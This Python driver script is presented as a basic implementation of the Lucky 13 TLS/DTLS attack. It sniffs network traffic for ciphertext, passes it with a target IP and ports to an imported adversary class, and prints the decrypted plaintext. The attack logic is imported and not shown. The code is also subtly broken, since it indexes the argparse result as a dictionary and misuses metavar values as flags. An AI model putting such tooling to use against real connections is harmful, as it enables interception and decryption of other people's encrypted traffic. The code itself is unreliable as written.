from argparse import ArgumentParser

from adversary.Lucky13Adversary import Lucky13Adversary
from network.Connection import Sniffer

if __name__ == '__main__':
    parser = ArgumentParser(
        description='Basic implementation of TLS/DTLS attack Lucky 13.'
    )
    parser.add_argument('inPort', metavar='-p', type=int, help='listening port')
    parser.add_argument('destIP', metavar='-ip', type=str, help='destination ip')
    parser.add_argument('destPort', metavar='-o', type=int, help='destination port')
    args = parser.parse_args()
    inPort = args['inPort']
    destIP = args['destIP']
    destPort = args['destPort']
    sniffer = Sniffer()
    ciphertext = sniffer.intercept()
    adversary = Lucky13Adversary(ciphertext, inPort, destIP, destPort)
    plaintext = adversary.decipher()
    print(f'Plaintext recovered: {plaintext}')
